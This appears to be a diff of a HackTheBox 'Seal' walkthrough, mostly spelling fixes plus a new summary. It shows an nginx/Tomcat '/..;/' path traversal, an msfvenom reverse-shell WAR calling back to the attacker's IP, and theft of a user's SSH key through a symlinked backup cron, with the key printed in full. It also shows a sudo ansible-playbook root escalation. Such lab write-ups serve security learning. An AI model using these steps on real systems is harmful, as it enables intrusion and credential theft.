@@ -1,4 +1,4 @@
-I"��<h2 id="summary">Summary</h2>
+I"��<h2 id="summary">Summary</h2>
 
 <p>10.129.190.13</p>
 
@@ -33,15 +33,14 @@
   </tbody>
 </table>
 
-<p>ABOUT THE BOX
-ABOUT THE BOX
-ABOUT THE BOX
-ABOUT THE BOX
-ABOUT THE BOX
-ABOUT THE BOX
-ABOUT THE BOX
-ABOUT THE BOX
-ABOUT THE BOX</p>
+<p>Seal starts with finding a cool nginx / tomcat path traversal exploit that lets us hit the tomcat manager page on 443 which nginx protects with a blacklist unless you have an SSL certificate. We also find credentials for tomcat in the commit history on the gitbucket instance on 8080, allowing us to log in to tomcat.
+From there, we upload a malicious WAR file to get a reverse shell on the box.
+From tomcat to Luis involves abusing a cron job, that uses ansible and rsync, to back up Luis’s private SSH key, then log in as Luis via SSH.
+Luis can run any ansible playbooks as root without a password, so we abuse this by creating a playbook to give us a root shell.</p>
+
+<p>A good box which taught me about the reverse proxy path traversal vulnerability and deepened my understanding of ansible playbooks.</p>
+
+<p>Note. The IP address of seal changes a couple of times due to having to restart the box when it became unresponsive, getting a new instance allocated and thus changing the IP address.</p>
 
 <h2 id="initial-recon">Initial Recon</h2>
 
@@ -230,7 +229,7 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Tue Dec 14 10:53:48 2021 -- 1 IP address (1 host up) scanned in 44.97 seconds
 </code></pre>
 
-<p>Nmap shows the box is probably Ubuntu from the services banners, we can find out which release by looking up the services versions on launchpad.</p>
+<p>Nmap shows the box is probably Ubuntu from the services banners, we can find out which release by looking up the services version on launchpad.</p>
 
 <p><img src="assets/seal_screenshots/launchpad_openssh_version.png" alt="launchpad" /></p>
 
@@ -240,7 +239,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 <p>Nmap also shows the hostsname <code class="language-plaintext highlighter-rouge">seal.htb</code> in the SSL certificate.</p>
 
-<p>First, let’s look in to the https site. Start by adding the hostname to <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+<p>First, let’s look into the https site. Start by adding the hostname to <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>vim /etc/hosts
 </code></pre></div></div>
@@ -256,11 +255,11 @@ OS and Service detection performed. Please report any incorrect results at https
 
 <p><img src="assets/seal_screenshots/seal_market_index.png" alt="seal_market_index" /></p>
 
-<p>We can try fuzzing the Search box. I seems to just perfrom a GET request with the searched string.</p>
+<p>We can try fuzzing the Search box. It seems to perfrom a GET request with the searched string.</p>
 
 <p><img src="assets/seal_screenshots/search_fuzz.png" alt="search_fuzz" /></p>
 
-<p>There dosent seem to be any LFI or SQL injection so we move on.</p>
+<p>There doesn’t seem to be any LFI or SQL injection, so we move on.</p>
 
 <p>Let’s check the directory fuzzing from AutoRecon’s feroxbuster.</p>
 
@@ -278,19 +277,19 @@ OS and Service detection performed. Please report any incorrect results at https
 302        0l        0w        0c https://10.129.190.13/host-manager
 </code></pre>
 
-<p>The manager and host-manager layout makes me think of Tomcat. Let’s try to get to the management interface.</p>
+<p>The manager and host-manager directories make me think of Tomcat. Let’s try to get to the management interface.</p>
 
 <p><img src="assets/seal_screenshots/manager_html_403.png" alt="manager_html" /></p>
 
-<p>We get an nginx 403 forbiden error, intresting.</p>
+<p>We get an nginx 403 forbidden error, interesting.</p>
 
 <p>Trying the /admin directory gets us a tomcat 404 error.</p>
 
 <p><img src="assets/seal_screenshots/admin_404.png" alt="admin_404" /></p>
 
-<p>This makes me think nginx is doing some sort of certificate based routing as we get a forbiden error with no oppertuinity to login.</p>
+<p>This makes me think nginx is doing some sort of certificate-based routing as we get a forbidden error with no opportunity to log in.</p>
 
-<p>A quick google for <code class="language-plaintext highlighter-rouge">tomcat nginx exploit</code> brings up an intresting path traversal vuln.</p>
+<p>A quick google for <code class="language-plaintext highlighter-rouge">tomcat nginx exploit</code> brings up an interesting path traversal vuln.</p>
 
 <p><img src="assets/seal_screenshots/google_tomcat_nginx.png" alt="google_tomcat_nginx" /></p>
 
@@ -298,9 +297,9 @@ OS and Service detection performed. Please report any incorrect results at https
 
 <pre><code class="language-txt">Description
 
-Web servers and reverse proxies normalize the request path. For example, the path /image/../image/ is normalized to /images/. When Apache Tomcat is used together with a reverse proxy such as nginx there is a nromalization inconsistency.
+Web servers and reverse proxies normalize the request path. For example, the path /image/../image/ is normalized to /images/. When Apache Tomcat is used together with a reverse proxy such as nginx there is a normalization inconsistency.
 
-Tomcat will threat the sequence /..;/ as /../ and normalize the path while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is.
+Tomcat will treat the sequence /..;/ as /../ and normalize the path, while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is.
 
 This allows an attacker to access Apache Tomcat resources that are not normally accessible via the reverse proxy mapping.
 Remediation
@@ -314,7 +313,7 @@ Configure the reverse proxy to reject paths that contain the Tomcat path paramet
 
 <p>Default credentials don’t log us in, so we need to find the credentials.</p>
 
-<p>We’ve exhausted the tricks for the https page for now, let’s dig in to the ‘httpproxy’ on 8080.</p>
+<p>We’ve exhausted the tricks for the https page for now, let’s dig into the ‘httpproxy’ on 8080.</p>
 
 <h2 id="httpproxy-enumeration">HTTPPROXY Enumeration</h2>
 
@@ -322,7 +321,7 @@ Configure the reverse proxy to reject paths that contain the Tomcat path paramet
 
 <p><img src="assets/seal_screenshots/git_bucket_index.png" alt="git_bucket_index" /></p>
 
-<p>Trying the default gitbucket credentials of <code class="language-plaintext highlighter-rouge">root:root</code> dosen’t log us in, but we can sign up for an account, so we’ll try that.</p>
+<p>Trying the default gitbucket credentials of <code class="language-plaintext highlighter-rouge">root:root</code> doesn’t log us in, but we can sign up for an account, so we’ll try that.</p>
 
 <p><img src="assets/seal_screenshots/create_account.png" alt="create_account" /></p>
 
@@ -332,15 +331,15 @@ Configure the reverse proxy to reject paths that contain the Tomcat path paramet
 
 <p><img src="assets/seal_screenshots/gitbucket_home.png" alt="gitbucket_home" /></p>
 
-<p>The infra repo contains tomcat anisble playbooks, but nothing usefull at the moment.</p>
+<p>The infra repo contains tomcat anisble playbooks, but nothing useful at the moment.</p>
 
 <p><img src="assets/seal_screenshots/infra_repo.png" alt="infra_repo" /></p>
 
-<p>The seal_market contains a tomcat directory, let’s look in to that.</p>
+<p>The seal_market contains a tomcat directory, let’s look into that.</p>
 
 <p><img src="assets/seal_screenshots/seal_market_tomcat_repo.png" alt="seal_market_tomcat_repo" /></p>
 
-<p>Here we see the <code class="language-plaintext highlighter-rouge">tomcat-users.xml</code> file, where tomcat stores it’s credientials. Browsing the current version of the file doesn’t contain any credientals.</p>
+<p>Here we see the <code class="language-plaintext highlighter-rouge">tomcat-users.xml</code> file, where tomcat stores it’s credentials. Browsing the current version of the file doesn’t contain any credentials.</p>
 
 <p><img src="assets/seal_screenshots/tomcat_users_current.png" alt="tomcat_users_current" /></p>
 
@@ -358,31 +357,31 @@ Configure the reverse proxy to reject paths that contain the Tomcat path paramet
 
 <p><img src="assets/seal_screenshots/tomcat_manager_login_creds.png" alt="tomcat_manager_login_creds" /></p>
 
-<p>The creds log us in to the tomcat manager page.</p>
+<p>The creds log us into the tomcat manager page.</p>
 
 <p><img src="assets/seal_screenshots/tomcat_web_manager.png" alt="tomcat_web_manager" /></p>
 
 <h2 id="tomcat-deploy-war-for-rce">Tomcat deploy WAR for RCE</h2>
 
-<p>We can upload a malicous war file to get a reverse shell on the server. We’ll use msfvenom to create the malicious file.</p>
+<p>We can upload a malicious war file to get a reverse shell on the server. We’ll use msfvenom to create the malicious file.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.54 <span class="nv">LPORT</span><span class="o">=</span>9001 <span class="nt">-f</span> war <span class="o">&gt;</span> shell.war
 </code></pre></div></div>
 
-<p>To upload the war file we need to intercept the request with burp so that we can use our path traversal exploit, otherwise we will get the nginx 403 page.</p>
+<p>To upload the war file we need to intercept the request with burp so we can use our path traversal exploit, otherwise we will get the nginx 403 page.</p>
 
 <p>Open burp and enable our burp proxy. In the tomcat web manager, under the ‘WAR file to deploy’ section, browse to the location where we created the reverse shell payload.</p>
 
 <p><img src="assets/seal_screenshots/deploy_war.png" alt="deploy_war" /></p>
 
-<p>Click deploy and in burp, change the path of the request to include the path traversal exploit.</p>
+<p>Click deploy, then in burp, change the path of the request to include the path traversal payload.</p>
 
 <pre><code class="language-txt">POST /manager/..;/manager/html/upload
 </code></pre>
 
 <p><img src="assets/seal_screenshots/burp_edit_deploy_request.png" alt="burp_edit_deploy_request" /></p>
 
-<p>We’ve sucsessfully uploaded our malicious payload.</p>
+<p>We’ve successfully uploaded our malicious payload.</p>
 
 <p><img src="assets/seal_screenshots/tomcat_manager_shell.png" alt="tomcat_manager_shell" /></p>
 
@@ -395,7 +394,7 @@ Configure the reverse proxy to reject paths that contain the Tomcat path paramet
 
 <p><img src="assets/seal_screenshots/reverse_shell.png" alt="reverse_shell" /></p>
 
-<p>We can upgrage our shell to a pty with the python method</p>
+<p>We can upgrade our shell to a pty with the python method</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>which python
 which python3
@@ -413,7 +412,7 @@ tomcat@seal:/var/lib/tomcat9<span class="nv">$ </span><span class="nb">export </
 
 <h2 id="privesc-to-user">PrivEsc to User</h2>
 
-<p>Now we have a shell as tomcat we need find a way to root.</p>
+<p>Now we have a shell as tomcat we need to find a way to root.</p>
 
 <p>Let’s find out what user accounts are on the box with login shells.</p>
 
@@ -422,7 +421,7 @@ root:x:0:0:root:/root:/bin/bash
 luis:x:1000:1000:,,,:/home/luis:/bin/bash
 </code></pre></div></div>
 
-<p>Poking around luis’s home directory we don’t find anything usefull, and there’s nothing in the crontab.
+<p>Poking around Luis’s home directory we don’t find anything useful, and there’s nothing in the crontab.
 But we find an ansible playbook in <code class="language-plaintext highlighter-rouge">/opt/backups/playbook/run.yml</code></p>
 
 <div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">hosts</span><span class="pi">:</span> <span class="s">localhost</span>
@@ -458,13 +457,13 @@ But we find an ansible playbook in <code class="language-plaintext highlighter-r
 
 <p><img src="assets/seal_screenshots/pspy_output.png" alt="pspy_output" /></p>
 
-<p>Every minuite there’s a cron running the playbook as luis.</p>
+<p>Every minute there’s a cron running the playbook as Luis.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/sbin/CRON <span class="nt">-f</span>
 /bin/sh <span class="nt">-c</span> <span class="nb">sleep </span>30 <span class="o">&amp;&amp;</span> <span class="nb">sudo</span> <span class="nt">-u</span> luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
 </code></pre></div></div>
 
-<p>The backups playbook uses the ansible <code class="language-plaintext highlighter-rouge">sysnchronise</code> plugin. Googling this leads us to the <a href="https://docs.ansible.com/ansible/latest/collections/ansible/posix/synchronize_module.html">anisble sysnchronise docs</a> where we see that it is an rsync wrapper and that <code class="language-plaintext highlighter-rouge">copy_links=yes</code> copys the source of the symlink instead of the symlink it’s self.</p>
+<p>The backups playbook uses the ansible <code class="language-plaintext highlighter-rouge">synchronise</code> plugin. Googling this leads us to the <a href="https://docs.ansible.com/ansible/latest/collections/ansible/posix/synchronize_module.html">anisble synchronise docs</a> where we see that it is an rsync wrapper and that <code class="language-plaintext highlighter-rouge">copy_links=yes</code> copys the source of the symlink instead of the symlink itself.</p>
 
 <p>We also find that we have write permissions in the <code class="language-plaintext highlighter-rouge">uploads</code> directory it’s backing up.</p>
 
@@ -480,12 +479,12 @@ drwxr-xr-x 4 root root  4096 Mar  7  2015 scripts
 drwxrwxrwx 2 root root  4096 May  7  2021 uploads
 </code></pre></div></div>
 
-<p>We can abuse this by creating a symlink to a sensative file owned by luis, such as his ssh private key. When the backup playbook runs it will copy the source of the symlink. Then we can unpack the backup and we should be able to access the private key as we have read permisons on the backed up directory.</p>
+<p>We can abuse this by creating a symlink to a sensitive file owned by Luis, such as his ssh private key. When the backup playbook runs it will copy the source of the symlink. Then we can unpack the backup and we should be able to access the private key as we have read permissions on the backed-up directory.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ln</span> <span class="nt">-s</span> /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/luis.id_rsa
 </code></pre></div></div>
 
-<p>Wait a miniute for the playbook cron to run, then check <code class="language-plaintext highlighter-rouge">/opt/backups/archives</code></p>
+<p>Wait a minute for the playbook cron to run, then check <code class="language-plaintext highlighter-rouge">/opt/backups/archives</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat@seal:/opt/backups/archives<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /opt/backups/archives/
 total 2384
@@ -497,7 +496,7 @@ drwxr-xr-x 4 luis luis   4096 Dec 14 15:03 ..
 <span class="nt">-rw-rw-r--</span> 1 luis luis 608926 Dec 14 15:03 backup-2021-12-14-15:03:32.gz
 </code></pre></div></div>
 
-<p>We find a backup that is bigger than the rest. We’ll copy and extract that, and check we got luis’s key.</p>
+<p>We find a backup that is bigger than the rest. We’ll copy and extract that, and check we got Luis’s key.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat@seal:/opt/backups/archives<span class="nv">$ </span><span class="nb">cp </span>backup-2021-12-14-15:03:32.gz /dev/shm/backup.gz<span class="p">;</span> <span class="nb">cd</span> /dev/shm
 tomcat@seal:/dev/shm<span class="nv">$ </span><span class="nb">gunzip</span> <span class="nt">-d</span> backup.gz
@@ -586,7 +585,7 @@ ueX7aq9pIXhcGT6M9CGUJjyEkvOrx+HRD4TKu0lGcO3LVANGPqSfks4r5Ea4LiZ4Q4YnOJ
 <span class="nt">-----END</span> OPENSSH PRIVATE KEY-----
 </code></pre></div></div>
 
-<p>Copy the key to our attacking box, chmod 600 it then use it to login to ssh.</p>
+<p>Copy the key to our attacking box, chmod 600 it then use it to log in to Luis via ssh.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> luis.id_rsa luis@10.129.190.22
 
@@ -605,11 +604,11 @@ luis@seal:~<span class="err">$</span>
 
 <h2 id="privesc-to-root">PrivEsc to root</h2>
 
-<p>Checking <code class="language-plaintext highlighter-rouge">sudo -l</code> shows luis can run ansible playbooks as root with no password.</p>
+<p>Checking <code class="language-plaintext highlighter-rouge">sudo -l</code> shows Luis can run ansible playbooks as root with no password.</p>
 
 <p><img src="assets/seal_screenshots/sudo_l.png" alt="sudo_l" /></p>
 
-<p>Checking <a href="https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo">gtfobins</a> shows how we can abuse this by creating an ansible palybook that sends us a reverse shell.</p>
+<p>Checking <a href="https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo">gtfobins</a> shows how we can abuse this by creating an ansible playbook that sends us a reverse shell.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span><span class="si">)</span>
 <span class="nb">echo</span> <span class="s1">'[{hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]}]'</span> <span class="o">&gt;</span><span class="nv">$TF</span>
